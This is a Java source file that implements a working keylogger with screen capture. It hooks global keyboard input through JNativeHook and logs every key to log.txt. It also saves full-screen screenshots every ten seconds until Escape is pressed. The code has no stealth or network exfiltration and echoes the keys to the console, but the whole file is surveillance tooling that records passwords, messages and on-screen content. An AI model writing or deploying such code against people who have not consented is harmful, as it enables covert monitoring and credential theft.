package md.luchfilip;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.nio.file.Path;
import java.nio.file.Paths;

public class Main implements NativeKeyListener {
    static PrintWriter writer = null;
    static long oldTime;
    static int imageCounter = 0;

    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));

        writer.println(NativeKeyEvent.getKeyText(e.getKeyCode()));

        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
                GlobalScreen.unregisterNativeHook();
                writer.close();
            } catch (NativeHookException e1) {
                e1.printStackTrace();
            }
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
    }

    public static void main(String[] args) {
        //init timer
        oldTime = System.nanoTime();

        // init log file
        try {
            writer = new PrintWriter("log.txt", "UTF-8");
            writer.println("Keyboard events");
        } catch (FileNotFoundException | UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }

        // start listenning to key events
        GlobalScreen.addNativeKeyListener(new Main());

        takeScreenshot();
        while (imageCounter < 10 && GlobalScreen.isNativeHookRegistered()) {
            double passedTimeSeconds = (double)(System.nanoTime()-oldTime) / 1000000000.0;
            if (passedTimeSeconds > 10) {
                imageCounter++;
                oldTime = System.nanoTime();
                takeScreenshot();
            }
        }


    }

    public static void takeScreenshot() {
        try {
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage capture = new Robot().createScreenCapture(screenRect);
            Path currentRelativePath = Paths.get("");
            String path = currentRelativePath.toAbsolutePath().toString();
            File file = new File(path + "/screenshot" + imageCounter + ".png");
            if(!file.exists()) file.createNewFile();
            FileOutputStream fos = new FileOutputStream(file);
            ImageIO.write( capture, "png", fos );


        } catch (AWTException | IOException e1) {
            e1.printStackTrace();
        }
    }
}